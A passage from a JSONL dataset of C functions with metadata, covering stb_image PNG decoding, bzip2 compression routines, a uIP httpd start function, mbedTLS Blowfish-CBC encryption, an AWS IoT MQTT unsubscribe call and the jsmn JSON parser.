(cur[k-out_n] >> 1); break;\n            CASE(F_paeth_first)  cur[k] = (uint8) (raw[k] + paeth(cur[k-out_n],0,0)); break;\n         }\n         #undef CASE\n      }\n   }\n   return 1;\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// take a -128..127 value and clamp it and convert to 0..255\n", "func_signal": "stbi_inline static uint8 clamp(int x)", "code": "{\n   // trick to use a single test to catch both cases\n   if ((unsigned int) x > 255) {\n      if (x < 0) return 0;\n      if (x > 255) return 255;\n   }\n   return (uint8) x;\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzDecompressInit)\n\t\t     ( bz_stream* strm,\n\t\t       int        verbosity,\n\t\t       int        small )", "code": "{\n   DState* s;\n\n   if (!bz_config_ok()) return BZ_CONFIG_ERROR;\n\n   if (strm == NULL) return BZ_PARAM_ERROR;\n   if (small != 0 && small != 1) return BZ_PARAM_ERROR;\n   if (verbosity < 0 || verbosity > 4) return BZ_PARAM_ERROR;\n\n   if (strm->bzalloc == NULL) strm->bzalloc = default_bzalloc;\n   if (strm->bzfree == NULL) strm->bzfree = default_bzfree;\n\n   s = BZALLOC( sizeof(DState) );\n   if (s == NULL) return BZ_MEM_ERROR;\n   s->strm                  = strm;\n   strm->state              = s;\n   s->state                 = BZ_X_MAGIC_1;\n   s->bsLive                = 0;\n   s->bsBuff                = 0;\n   s->calculatedCombinedCRC = 0;\n   strm->total_in_lo32      = 0;\n   strm->total_in_hi32      = 0;\n   strm->total_out_lo32     = 0;\n   strm->total_out_hi32     = 0;\n   s->smallDecompress       = (Bool)small;\n   s->ll4                   = NULL;\n   s->ll16                  = NULL;\n   s->tt                    = NULL;\n   s->currBlockNo           = 0;\n   s->verbosity             = verbosity;\n\n   return BZ_OK;\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "void BZ_API(BZ2_bzWrite)\n\t     ( int*    bzerror,\n\t       BZFILE* b,\n\t       void*   buf,\n\t       int     len )", "code": "{\n   Int32 n, n2, ret;\n   bzFile* bzf = (bzFile*)b;\n\n   BZ_SETERR(BZ_OK);\n   if (bzf == NULL || buf == NULL || len < 0)\n      { BZ_SETERR(BZ_PARAM_ERROR); return; };\n   if (!(bzf->writing))\n      { BZ_SETERR(BZ_SEQUENCE_ERROR); return; };\n   if (ferror(bzf->handle))\n      { BZ_SETERR(BZ_IO_ERROR); return; };\n\n   if (len == 0)\n      { BZ_SETERR(BZ_OK); return; };\n\n   bzf->strm.avail_in = len;\n   bzf->strm.next_in  = buf;\n\n   while (True) {\n      bzf->strm.avail_out = BZ_MAX_UNUSED;\n      bzf->strm.next_out = bzf->buf;\n      ret = BZ2_bzCompress ( &(bzf->strm), BZ_RUN );\n      if (ret != BZ_RUN_OK)\n\t { BZ_SETERR(ret); return; };\n\n      if (bzf->strm.avail_out < BZ_MAX_UNUSED) {\n\t n = BZ_MAX_UNUSED - bzf->strm.avail_out;\n\t n2 = fwrite ( (void*)(bzf->buf), sizeof(UChar),\n\t\t       n, bzf->handle );\n\t if (n != n2 || ferror(bzf->handle))\n\t    { BZ_SETERR(BZ_IO_ERROR); return; };\n      }\n\n      if (bzf->strm.avail_in == 0)\n\t { BZ_SETERR(BZ_OK); return; };\n   }\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzBuffToBuffCompress)\n\t\t\t ( char*         dest,\n\t\t\t   unsigned int* destLen,\n\t\t\t   char*         source,\n\t\t\t   unsigned int  sourceLen,\n\t\t\t   int           blockSize100k,\n\t\t\t   int           verbosity,\n\t\t\t   int           workFactor )", "code": "{\n   bz_stream strm;\n   int ret;\n\n   if (dest == NULL || destLen == NULL ||\n       source == NULL ||\n       blockSize100k < 1 || blockSize100k > 9 ||\n       verbosity < 0 || verbosity > 4 ||\n       workFactor < 0 || workFactor > 250)\n      return BZ_PARAM_ERROR;\n\n   if (workFactor == 0) workFactor = 30;\n   strm.bzalloc = NULL;\n   strm.bzfree = NULL;\n   strm.opaque = NULL;\n   ret = BZ2_bzCompressInit ( &strm, blockSize100k,\n\t\t\t      verbosity, workFactor );\n   if (ret != BZ_OK) return ret;\n\n   strm.next_in = source;\n   strm.next_out = dest;\n   strm.avail_in = sourceLen;\n   strm.avail_out = *destLen;\n\n   ret = BZ2_bzCompress ( &strm, BZ_FINISH );\n   if (ret == BZ_FINISH_OK) goto output_overflow;\n   if (ret != BZ_STREAM_END) goto errhandler;\n\n   /* normal termination */\n   *destLen -= strm.avail_out;\n   BZ2_bzCompressEnd ( &strm );\n   return BZ_OK;\n\n   output_overflow:\n   BZ2_bzCompressEnd ( &strm );\n   return BZ_OUTBUFF_FULL;\n\n   errhandler:\n   BZ2_bzCompressEnd ( &strm );\n   return ret;\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzCompressEnd)  ( bz_stream *strm )", "code": "{\n   EState* s;\n   if (strm == NULL) return BZ_PARAM_ERROR;\n   s = strm->state;\n   if (s == NULL) return BZ_PARAM_ERROR;\n   if (s->strm != strm) return BZ_PARAM_ERROR;\n\n   if (s->arr1 != NULL) BZFREE(s->arr1);\n   if (s->arr2 != NULL) BZFREE(s->arr2);\n   if (s->ftab != NULL) BZFREE(s->ftab);\n   BZFREE(strm->state);\n\n   strm->state = NULL;\n\n   return BZ_OK;\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "void BZ_API(BZ2_bzclose) (BZFILE* b)", "code": "{\n   int bzerr;\n   FILE *fp = ((bzFile *)b)->handle;\n\n   if (b==NULL) {return;}\n   if(((bzFile*)b)->writing){\n      BZ2_bzWriteClose(&bzerr,b,0,NULL,NULL);\n      if(bzerr != BZ_OK){\n\t BZ2_bzWriteClose(NULL,b,1,NULL,NULL);\n      }\n   }else{\n      BZ2_bzReadClose(&bzerr,b);\n   }\n   if(fp!=stdin && fp!=stdout){\n      fclose(fp);\n   }\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nvoid* default_bzalloc ( void* opaque, Int32 items, Int32 size )", "code": "{\n   void* v = malloc ( items * size );\n   return v;\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzRead)\n\t   ( int*    bzerror,\n\t     BZFILE* b,\n\t     void*   buf,\n\t     int     len )", "code": "{\n   Int32   n, ret;\n   bzFile* bzf = (bzFile*)b;\n\n   BZ_SETERR(BZ_OK);\n\n   if (bzf == NULL || buf == NULL || len < 0)\n      { BZ_SETERR(BZ_PARAM_ERROR); return 0; };\n\n   if (bzf->writing)\n      { BZ_SETERR(BZ_SEQUENCE_ERROR); return 0; };\n\n   if (len == 0)\n      { BZ_SETERR(BZ_OK); return 0; };\n\n   bzf->strm.avail_out = len;\n   bzf->strm.next_out = buf;\n\n   while (True) {\n\n      if (ferror(bzf->handle))\n\t { BZ_SETERR(BZ_IO_ERROR); return 0; };\n\n      if (bzf->strm.avail_in == 0 && !myfeof(bzf->handle)) {\n\t n = fread ( bzf->buf, sizeof(UChar),\n\t\t     BZ_MAX_UNUSED, bzf->handle );\n\t if (ferror(bzf->handle))\n\t    { BZ_SETERR(BZ_IO_ERROR); return 0; };\n\t bzf->bufN = n;\n\t bzf->strm.avail_in = bzf->bufN;\n\t bzf->strm.next_in = bzf->buf;\n      }\n\n      ret = BZ2_bzDecompress ( &(bzf->strm) );\n\n      if (ret != BZ_OK && ret != BZ_STREAM_END)\n\t { BZ_SETERR(ret); return 0; };\n\n      if (ret == BZ_OK && myfeof(bzf->handle) &&\n\t  bzf->strm.avail_in == 0 && bzf->strm.avail_out > 0)\n\t { BZ_SETERR(BZ_UNEXPECTED_EOF); return 0; };\n\n      if (ret == BZ_STREAM_END)\n\t { BZ_SETERR(BZ_STREAM_END);\n\t   return len - bzf->strm.avail_out; };\n      if (bzf->strm.avail_out == 0)\n\t { BZ_SETERR(BZ_OK); return len; };\n\n   }\n\n   return 0; /*not reached*/\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "void BZ_API(BZ2_bzReadClose) ( int *bzerror, BZFILE *b )", "code": "{\n   bzFile* bzf = (bzFile*)b;\n\n   BZ_SETERR(BZ_OK);\n   if (bzf == NULL)\n      { BZ_SETERR(BZ_OK); return; };\n\n   if (bzf->writing)\n      { BZ_SETERR(BZ_SEQUENCE_ERROR); return; };\n\n   if (bzf->initialisedOk)\n      (void)BZ2_bzDecompressEnd ( &(bzf->strm) );\n   free ( bzf );\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nBool copy_input_until_stop ( EState* s )", "code": "{\n   Bool progress_in = False;\n\n   if (s->mode == BZ_M_RUNNING) {\n\n      /*-- fast track the common case --*/\n      while (True) {\n\t /*-- block full? --*/\n\t if (s->nblock >= s->nblockMAX) break;\n\t /*-- no input? --*/\n\t if (s->strm->avail_in == 0) break;\n\t progress_in = True;\n\t ADD_CHAR_TO_BLOCK ( s, (UInt32)(*((UChar*)(s->strm->next_in))) );\n\t s->strm->next_in++;\n\t s->strm->avail_in--;\n\t s->strm->total_in_lo32++;\n\t if (s->strm->total_in_lo32 == 0) s->strm->total_in_hi32++;\n      }\n\n   } else {\n\n      /*-- general, uncommon case --*/\n      while (True) {\n\t /*-- block full? --*/\n\t if (s->nblock >= s->nblockMAX) break;\n\t /*-- no input? --*/\n\t if (s->strm->avail_in == 0) break;\n\t /*-- flush/finish end? --*/\n\t if (s->avail_in_expect == 0) break;\n\t progress_in = True;\n\t ADD_CHAR_TO_BLOCK ( s, (UInt32)(*((UChar*)(s->strm->next_in))) );\n\t s->strm->next_in++;\n\t s->strm->avail_in--;\n\t s->strm->total_in_lo32++;\n\t if (s->strm->total_in_lo32 == 0) s->strm->total_in_hi32++;\n\t s->avail_in_expect--;\n      }\n   }\n   return progress_in;\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nvoid prepare_new_block ( EState* s )", "code": "{\n   Int32 i;\n   s->nblock = 0;\n   s->numZ = 0;\n   s->state_out_pos = 0;\n   BZ_INITIALISE_CRC ( s->blockCRC );\n   for (i = 0; i < 256; i++) s->inUse[i] = False;\n   s->blockNo++;\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "void BZ_API(BZ2_bzWriteClose)\n\t\t  ( int*          bzerror,\n\t\t    BZFILE*       b,\n\t\t    int           abandon,\n\t\t    unsigned int* nbytes_in,\n\t\t    unsigned int* nbytes_out )", "code": "{\n   BZ2_bzWriteClose64 ( bzerror, b, abandon,\n\t\t\tnbytes_in, NULL, nbytes_out, NULL );\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzwrite) (BZFILE* b, void* buf, int len )", "code": "{\n   int bzerr;\n\n   BZ2_bzWrite(&bzerr,b,buf,len);\n   if(bzerr == BZ_OK){\n      return len;\n   }else{\n      return -1;\n   }\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzread) (BZFILE* b, void* buf, int len )", "code": "{\n   int bzerr, nread;\n   if (((bzFile*)b)->lastErr == BZ_STREAM_END) return 0;\n   nread = BZ2_bzRead(&bzerr,b,buf,len);\n   if (bzerr == BZ_OK || bzerr == BZ_STREAM_END) {\n      return nread;\n   } else {\n      return -1;\n   }\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nBool copy_output_until_stop ( EState* s )", "code": "{\n   Bool progress_out = False;\n\n   while (True) {\n\n      /*-- no output space? --*/\n      if (s->strm->avail_out == 0) break;\n\n      /*-- block done? --*/\n      if (s->state_out_pos >= s->numZ) break;\n\n      progress_out = True;\n      *(s->strm->next_out) = s->zbits[s->state_out_pos];\n      s->state_out_pos++;\n      s->strm->avail_out--;\n      s->strm->next_out++;\n      s->strm->total_out_lo32++;\n      if (s->strm->total_out_lo32 == 0) s->strm->total_out_hi32++;\n   }\n\n   return progress_out;\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "__inline__ Int32 BZ2_indexIntoF ( Int32 indx, Int32 *cftab )", "code": "{\n   Int32 nb, na, mid;\n   nb = 0;\n   na = 256;\n   do {\n      mid = (nb + na) >> 1;\n      if (indx >= cftab[mid]) nb = mid; else na = mid;\n   }\n   while (na - nb != 1);\n   return nb;\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzCompress) ( bz_stream *strm, int action )", "code": "{\n   Bool progress;\n   EState* s;\n   if (strm == NULL) return BZ_PARAM_ERROR;\n   s = strm->state;\n   if (s == NULL) return BZ_PARAM_ERROR;\n   if (s->strm != strm) return BZ_PARAM_ERROR;\n\n   preswitch:\n   switch (s->mode) {\n\n      case BZ_M_IDLE:\n\t return BZ_SEQUENCE_ERROR;\n\n      case BZ_M_RUNNING:\n\t if (action == BZ_RUN) {\n\t    progress = handle_compress ( strm );\n\t    return progress ? BZ_RUN_OK : BZ_PARAM_ERROR;\n\t }\n\t else\n\t if (action == BZ_FLUSH) {\n\t    s->avail_in_expect = strm->avail_in;\n\t    s->mode = BZ_M_FLUSHING;\n\t    goto preswitch;\n\t }\n\t else\n\t if (action == BZ_FINISH) {\n\t    s->avail_in_expect = strm->avail_in;\n\t    s->mode = BZ_M_FINISHING;\n\t    goto preswitch;\n\t }\n\t else\n\t    return BZ_PARAM_ERROR;\n\n      case BZ_M_FLUSHING:\n\t if (action != BZ_FLUSH) return BZ_SEQUENCE_ERROR;\n\t if (s->avail_in_expect != s->strm->avail_in)\n\t    return BZ_SEQUENCE_ERROR;\n\t progress = handle_compress ( strm );\n\t if (s->avail_in_expect > 0 || !isempty_RL(s) ||\n\t     s->state_out_pos < s->numZ) return BZ_FLUSH_OK;\n\t s->mode = BZ_M_RUNNING;\n\t return BZ_RUN_OK;\n\n      case BZ_M_FINISHING:\n\t if (action != BZ_FINISH) return BZ_SEQUENCE_ERROR;\n\t if (s->avail_in_expect != s->strm->avail_in)\n\t    return BZ_SEQUENCE_ERROR;\n\t progress = handle_compress ( strm );\n\t if (!progress) return BZ_SEQUENCE_ERROR;\n\t if (s->avail_in_expect > 0 || !isempty_RL(s) ||\n\t     s->state_out_pos < s->numZ) return BZ_FINISH_OK;\n\t s->mode = BZ_M_IDLE;\n\t return BZ_STREAM_END;\n   }\n   return BZ_OK; /*--not reached--*/\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzDecompress) ( bz_stream *strm )", "code": "{\n   DState* s;\n   if (strm == NULL) return BZ_PARAM_ERROR;\n   s = strm->state;\n   if (s == NULL) return BZ_PARAM_ERROR;\n   if (s->strm != strm) return BZ_PARAM_ERROR;\n\n   while (True) {\n#if defined(CONFIG_HW_WATCHDOG) || defined(CONFIG_WATCHDOG)\n\tWATCHDOG_RESET();\n#endif\n      if (s->state == BZ_X_IDLE) return BZ_SEQUENCE_ERROR;\n      if (s->state == BZ_X_OUTPUT) {\n\t if (s->smallDecompress)\n\t    unRLE_obuf_to_output_SMALL ( s ); else\n\t    unRLE_obuf_to_output_FAST  ( s );\n\t if (s->nblock_used == s->save_nblock+1 && s->state_out_len == 0) {\n\t    BZ_FINALISE_CRC ( s->calculatedBlockCRC );\n\t    if (s->verbosity >= 3)\n\t       VPrintf2 ( \" {0x%x, 0x%x}\", s->storedBlockCRC,\n\t\t\t  s->calculatedBlockCRC );\n\t    if (s->verbosity >= 2) VPrintf0 ( \"]\" );\n\t    if (s->calculatedBlockCRC != s->storedBlockCRC)\n\t       return BZ_DATA_ERROR;\n\t    s->calculatedCombinedCRC\n\t       = (s->calculatedCombinedCRC << 1) |\n\t\t    (s->calculatedCombinedCRC >> 31);\n\t    s->calculatedCombinedCRC ^= s->calculatedBlockCRC;\n\t    s->state = BZ_X_BLKHDR_1;\n\t } else {\n\t    return BZ_OK;\n\t }\n      }\n      if (s->state >= BZ_X_MAGIC_1) {\n\t Int32 r = BZ2_decompress ( s );\n\t if (r == BZ_STREAM_END) {\n\t    if (s->verbosity >= 3)\n\t       VPrintf2 ( \"\\n    combined CRCs: stored = 0x%x, computed = 0x%x\",\n\t\t\t  s->storedCombinedCRC, s->calculatedCombinedCRC );\n\t    if (s->calculatedCombinedCRC != s->storedCombinedCRC)\n\t       return BZ_DATA_ERROR;\n\t    return r;\n\t }\n\t if (s->state != BZ_X_OUTPUT) return r;\n      }\n   }\n\n   AssertH ( 0, 6001 );\n\n   return 0;  /*NOTREACHED*/\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nBool handle_compress ( bz_stream* strm )", "code": "{\n   Bool progress_in  = False;\n   Bool progress_out = False;\n   EState* s = strm->state;\n\n   while (True) {\n\n      if (s->state == BZ_S_OUTPUT) {\n\t progress_out |= copy_output_until_stop ( s );\n\t if (s->state_out_pos < s->numZ) break;\n\t if (s->mode == BZ_M_FINISHING &&\n\t     s->avail_in_expect == 0 &&\n\t     isempty_RL(s)) break;\n\t prepare_new_block ( s );\n\t s->state = BZ_S_INPUT;\n\t if (s->mode == BZ_M_FLUSHING &&\n\t     s->avail_in_expect == 0 &&\n\t     isempty_RL(s)) break;\n      }\n\n      if (s->state == BZ_S_INPUT) {\n\t progress_in |= copy_input_until_stop ( s );\n\t if (s->mode != BZ_M_RUNNING && s->avail_in_expect == 0) {\n\t    flush_RL ( s );\n\t    BZ2_compressBlock ( s, (Bool)(s->mode == BZ_M_FINISHING) );\n\t    s->state = BZ_S_OUTPUT;\n\t }\n\t else\n\t if (s->nblock >= s->nblockMAX) {\n\t    BZ2_compressBlock ( s, False );\n\t    s->state = BZ_S_OUTPUT;\n\t }\n\t else\n\t if (s->strm->avail_in == 0) {\n\t    break;\n\t }\n      }\n\n   }\n\n   return progress_in || progress_out;\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "BZFILE* BZ_API(BZ2_bzReadOpen)\n\t\t   ( int*  bzerror,\n\t\t     FILE* f,\n\t\t     int   verbosity,\n\t\t     int   small,\n\t\t     void* unused,\n\t\t     int   nUnused )", "code": "{\n   bzFile* bzf = NULL;\n   int     ret;\n\n   BZ_SETERR(BZ_OK);\n\n   if (f == NULL ||\n       (small != 0 && small != 1) ||\n       (verbosity < 0 || verbosity > 4) ||\n       (unused == NULL && nUnused != 0) ||\n       (unused != NULL && (nUnused < 0 || nUnused > BZ_MAX_UNUSED)))\n      { BZ_SETERR(BZ_PARAM_ERROR); return NULL; };\n\n   if (ferror(f))\n      { BZ_SETERR(BZ_IO_ERROR); return NULL; };\n\n   bzf = malloc ( sizeof(bzFile) );\n   if (bzf == NULL)\n      { BZ_SETERR(BZ_MEM_ERROR); return NULL; };\n\n   BZ_SETERR(BZ_OK);\n\n   bzf->initialisedOk = False;\n   bzf->handle        = f;\n   bzf->bufN          = 0;\n   bzf->writing       = False;\n   bzf->strm.bzalloc  = NULL;\n   bzf->strm.bzfree   = NULL;\n   bzf->strm.opaque   = NULL;\n\n   while (nUnused > 0) {\n      bzf->buf[bzf->bufN] = *((UChar*)(unused)); bzf->bufN++;\n      unused = ((void*)( 1 + ((UChar*)(unused))  ));\n      nUnused--;\n   }\n\n   ret = BZ2_bzDecompressInit ( &(bzf->strm), verbosity, small );\n   if (ret != BZ_OK)\n      { BZ_SETERR(ret); free(bzf); return NULL; };\n\n   bzf->strm.avail_in = bzf->bufN;\n   bzf->strm.next_in  = bzf->buf;\n\n   bzf->initialisedOk = True;\n   return bzf;\n}", "path": "Code\\Uboot_httpd\\lib_generic\\temp\\bzlib.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "// start http daemon\n", "func_signal": "void HttpdStart( void )", "code": "{\n\tuip_init();\n\thttpd_init();\n}", "path": "Code\\Uboot_httpd\\net\\httpd.c", "repo_name": "aggresss/RFDemo", "stars": 197, "license": "None", "language": "c", "size": 68541}
{"docstring": "/*\n * Blowfish-CBC buffer encryption/decryption\n */\n", "func_signal": "int mbedtls_blowfish_crypt_cbc( mbedtls_blowfish_context *ctx,\n                    int mode,\n                    size_t length,\n                    unsigned char iv[MBEDTLS_BLOWFISH_BLOCKSIZE],\n                    const unsigned char *input,\n                    unsigned char *output )", "code": "{\n    int i;\n    unsigned char temp[MBEDTLS_BLOWFISH_BLOCKSIZE];\n\n    if( length % MBEDTLS_BLOWFISH_BLOCKSIZE )\n        return( MBEDTLS_ERR_BLOWFISH_INVALID_INPUT_LENGTH );\n\n    if( mode == MBEDTLS_BLOWFISH_DECRYPT )\n    {\n        while( length > 0 )\n        {\n            memcpy( temp, input, MBEDTLS_BLOWFISH_BLOCKSIZE );\n            mbedtls_blowfish_crypt_ecb( ctx, mode, input, output );\n\n            for( i = 0; i < MBEDTLS_BLOWFISH_BLOCKSIZE;i++ )\n                output[i] = (unsigned char)( output[i] ^ iv[i] );\n\n            memcpy( iv, temp, MBEDTLS_BLOWFISH_BLOCKSIZE );\n\n            input  += MBEDTLS_BLOWFISH_BLOCKSIZE;\n            output += MBEDTLS_BLOWFISH_BLOCKSIZE;\n            length -= MBEDTLS_BLOWFISH_BLOCKSIZE;\n        }\n    }\n    else\n    {\n        while( length > 0 )\n        {\n            for( i = 0; i < MBEDTLS_BLOWFISH_BLOCKSIZE; i++ )\n                output[i] = (unsigned char)( input[i] ^ iv[i] );\n\n            mbedtls_blowfish_crypt_ecb( ctx, mode, output, output );\n            memcpy( iv, output, MBEDTLS_BLOWFISH_BLOCKSIZE );\n\n            input  += MBEDTLS_BLOWFISH_BLOCKSIZE;\n            output += MBEDTLS_BLOWFISH_BLOCKSIZE;\n            length -= MBEDTLS_BLOWFISH_BLOCKSIZE;\n        }\n    }\n\n    return( 0 );\n}", "path": "src\\aws_iot_src\\external_libs\\mbedTLS\\library\\blowfish.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/**\n * @brief Unsubscribe to an MQTT topic.\n *\n * Called to send an unsubscribe message to the broker requesting removal of a subscription\n * to an MQTT topic.\n * @note Call is blocking.  The call returns after the receipt of the UNSUBACK control packet.\n * This is the outer function which does the validations and calls the internal unsubscribe above\n * to perform the actual operation. It is also responsible for client state changes\n *\n * @param pClient Reference to the IoT Client\n * @param pTopicName Topic Name to publish to\n * @param topicNameLen Length of the topic name\n *\n * @return An IoT Error Type defining successful/failed unsubscribe call\n */\n", "func_signal": "IoT_Error_t aws_iot_mqtt_unsubscribe(AWS_IoT_Client *pClient, const char *pTopicFilter, uint16_t topicFilterLen)", "code": "{\n\tif(NULL == pClient || NULL == pTopicFilter) {\n\t\treturn NULL_VALUE_ERROR;\n\t}\n\n\tif(!aws_iot_mqtt_is_client_connected(pClient)) {\n\t\treturn NETWORK_DISCONNECTED_ERROR;\n\t}\n\n\tClientState clientState =  aws_iot_mqtt_get_client_state(pClient);\n\tif(CLIENT_STATE_CONNECTED_IDLE != clientState && CLIENT_STATE_CONNECTED_WAIT_FOR_CB_RETURN != clientState) {\n\t\treturn MQTT_CLIENT_NOT_IDLE_ERROR;\n\t}\n\n\tIoT_Error_t rc = aws_iot_mqtt_set_client_state(pClient, clientState, CLIENT_STATE_CONNECTED_UNSUBSCRIBE_IN_PROGRESS);\n\tif(SUCCESS != rc) {\n\t\trc = aws_iot_mqtt_set_client_state(pClient, CLIENT_STATE_CONNECTED_UNSUBSCRIBE_IN_PROGRESS, clientState);\n\t\treturn rc;\n\t}\n\n\tIoT_Error_t unsubRc = _aws_iot_mqtt_internal_unsubscribe(pClient, pTopicFilter, topicFilterLen);\n\n\trc = aws_iot_mqtt_set_client_state(pClient, CLIENT_STATE_CONNECTED_UNSUBSCRIBE_IN_PROGRESS, clientState);\n\tif(SUCCESS == unsubRc && SUCCESS != rc) {\n\t\tunsubRc = rc;\n\t}\n\n\treturn unsubRc;\n}", "path": "src\\aws_iot_src\\src\\aws_iot_mqtt_client_unsubscribe.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/**\n * Parse JSON string and fill tokens.\n */\n", "func_signal": "jsmnerr_t jsmn_parse(jsmn_parser *parser, const char *js, size_t len,\n        jsmntok_t *tokens, unsigned int num_tokens)", "code": "{\n    jsmnerr_t r;\n    int i;\n    jsmntok_t *token;\n    int count = 0;\n\n    for (; parser->pos < len && js[parser->pos] != '\\0'; parser->pos++) {\n        char c;\n        jsmntype_t type;\n\n        c = js[parser->pos];\n        switch (c) {\n        case '{':\n        case '[':\n            count++;\n            if (tokens == NULL) {\n                break;\n            }\n            token = jsmn_alloc_token(parser, tokens, num_tokens);\n            if (token == NULL)\n                return JSMN_ERROR_NOMEM;\n            if (parser->toksuper != -1) {\n                tokens[parser->toksuper].size++;\n#ifdef JSMN_PARENT_LINKS\n                token->parent = parser->toksuper;\n#endif\n            }\n            token->type = (c == '{' ? JSMN_OBJECT : JSMN_ARRAY);\n            token->start = parser->pos;\n            parser->toksuper = parser->toknext - 1;\n            break;\n        case '}':\n        case ']':\n            if (tokens == NULL)\n                break;\n            type = (c == '}' ? JSMN_OBJECT : JSMN_ARRAY);\n#ifdef JSMN_PARENT_LINKS\n            if (parser->toknext < 1) {\n                return JSMN_ERROR_INVAL;\n            }\n            token = &tokens[parser->toknext - 1];\n            for (;;) {\n                if (token->start != -1 && token->end == -1) {\n                    if (token->type != type) {\n                        return JSMN_ERROR_INVAL;\n                    }\n                    token->end = parser->pos + 1;\n                    parser->toksuper = token->parent;\n                    break;\n                }\n                if (token->parent == -1) {\n                    break;\n                }\n                token = &tokens[token->parent];\n            }\n#else\n            for (i = parser->toknext - 1; i >= 0; i--) {\n                token = &tokens[i];\n                if (token->start != -1 && token->end == -1) {\n                    if (token->type != type) {\n                        return JSMN_ERROR_INVAL;\n                    }\n                    parser->toksuper = -1;\n                    token->end = parser->pos + 1;\n                    break;\n                }\n            }\n            /* Error if unmatched closing bracket */\n            if (i == -1)\n                return JSMN_ERROR_INVAL;\n            for (; i >= 0; i--) {\n                token = &tokens[i];\n                if (token->start != -1 && token->end == -1) {\n                    parser->toksuper = i;\n                    break;\n                }\n            }\n#endif\n            break;\n        case '\\\"':\n            r = jsmn_parse_string(parser, js, len, tokens, num_tokens);\n            if (r < 0)\n                return r;\n            count++;\n            if (parser->toksuper != -1 && tokens != NULL)\n                tokens[parser->toksuper].size++;\n            break;\n        case '\\t':\n        case '\\r':\n        case '\\n':\n        case ':':\n        case ',':\n        case ' ':\n            break;\n#ifdef JSMN_STRICT\n            /* In strict mode primitives are: numbers and booleans */\n        case '-':\n        case '0':\n        case '1':\n        case '2':\n        case '3':\n        case '4':\n        case '5':\n        case '6':\n        case '7':\n        case '8':\n        case '9':\n    